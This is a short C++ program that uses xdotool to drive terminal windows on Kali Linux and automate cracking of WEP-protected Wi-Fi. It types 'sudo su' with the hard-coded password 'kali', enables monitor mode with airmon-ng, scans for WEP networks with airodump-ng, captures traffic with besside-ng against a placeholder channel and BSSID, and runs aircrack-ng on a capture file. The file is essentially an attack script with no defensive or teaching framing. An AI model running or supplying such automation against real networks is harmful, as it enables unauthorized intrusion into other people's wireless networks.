#include <cstdlib>
#include <thread> // Add this header for the sleep function

int main() {
    std::system("x-terminal-emulator &"); // Open terminal emulator in the background
    std::system("sleep 1"); // Wait for terminal emulator to open

// access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

//enabling the moniter mode
    std::system("sleep 1");
    
    std::system("xdotool type \"airmon-ng start wlan0\"");
    std::system("xdotool key Return");

//cracking the wep wifi
    std::system("xdotool type \"aircrack-ng ./wep.cap\"");

//capturing packets in the wep wifi
    std::system("x-terminal-emulator &");
    std::system("sleep 1");
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"cd /home/kali/wifi/wepwifi\"");
    std::system("xdotool key Return");

    std::system("xdotool type \"besside-ng wlan0 -c (2) -b (bssid)\"");

//checking the wifi that are in the range
    std::system("x-terminal-emulator &");
    std::system("sleep 1");
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");
    
    std::system("xdotool type \"airodump-ng wlan0 --encrypt wep\"");
    std::system("xdotool key Return");
    return 0;
}
